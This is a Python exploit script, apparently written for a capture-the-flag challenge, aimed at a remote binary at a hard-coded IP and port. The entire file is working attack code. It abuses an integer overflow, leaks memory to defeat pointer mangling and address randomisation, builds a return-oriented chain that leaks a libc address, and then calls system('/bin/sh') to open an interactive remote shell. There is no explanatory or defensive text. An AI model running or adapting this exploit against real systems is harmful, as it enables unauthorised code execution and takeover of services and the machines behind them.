from threading import Thread
from zio import *
target = './class'
target = ('58.213.63.30', 4001)

def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)

def rerol(d):
    return ((d<<(64-0x11))+(d>>0x11))&0xffffffffffffffff

def rol(d):
    return ((d<<0x11) + (d>>(64-0x11)))&0xffffffffffffffff

def show(io, id):
    io.read_until('>>')
    io.writeline('2')
    io.read_until(':')
    io.writeline(str(id))

    io.read_until('name:')
    r12 = l64(io.read_until(',')[:-1].ljust(8, '\x00'))
    print 'r12', hex(r12)
    io.read_until('addr:')
    enc_rsp = l64(io.read(8))
    enc_rip = l64(io.read_until(',')[:-1].ljust(8, '\x00'))

    base = r12 - 0xaa0
    print 'enc_rsp', hex(enc_rsp)
    print 'enc_rip', hex(enc_rip)

    real_rip = base + 0x1495
    cookie = rerol(enc_rip)^real_rip

    print 'cookie', hex(cookie)

    real_rsp = rerol(enc_rsp)^cookie
    print 'real_rsp', hex(real_rsp)

    return (base, real_rsp, cookie)

def edit(io, id, age, name, addr, introduce):
    io.read_until('>>')
    io.writeline('3')
    io.read_until(':')
    io.writeline(str(id))
    io.read_until(':')
    io.writeline(name)
    io.read_until(':')
    io.writeline(str(age))
    io.read_until(':')
    io.writeline(addr)
    io.read_until(':')
    io.writeline(introduce)


def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))

    io.read_until(':')
    io.writeline(str(92233720368547759))
    base, rsp, cookie = show(io, 1)
    print 'base', hex(base)

    fake_rsp = rsp - 0x48
    pop_rdi_ret = base + 0x000000000001523

    addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie))
    print HEX(addr)
    edit(io, 1, 0, "", addr, "")

    io.read_until('>>')
    payload = '5;'+'a'*6

    puts_got = 0x0000000000202018+ base
    puts_plt = 0x9a0 + base
    main = base + 0x00000000000013ff
    payload += l64(puts_got)+l64(puts_plt)+l64(main)
    io.writeline(payload)

    puts_addr = l64(io.readline()[:-1].ljust(8, '\x00'))
    '''
    base = puts_addr - 0x000000000006F5D0

    system = base + 0x0000000000045380

    print 'system', hex(system)
    binsh = base + 0x000000000018C58B
    '''

    base = puts_addr - 0x000000000006FD60
    print 'base', hex(base)
    system = base + 0x0000000000046590
    binsh = base + 0x000000000017C8C3

    #io.gdb_hint()
    io.read_until(':')
    io.writeline(str(92233720368547759))


    fake_rsp = rsp - 0x80

    addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie))
    print HEX(addr)
    io.gdb_hint()
    edit(io, 1, 0, "", addr, "")

    io.read_until('>>')
    payload = '5;'+'a'*6

    payload += l64(binsh)+l64(system)+l64(main)
    io.writeline(payload)

    #io.gdb_hint()
    interact(io)

exp(target)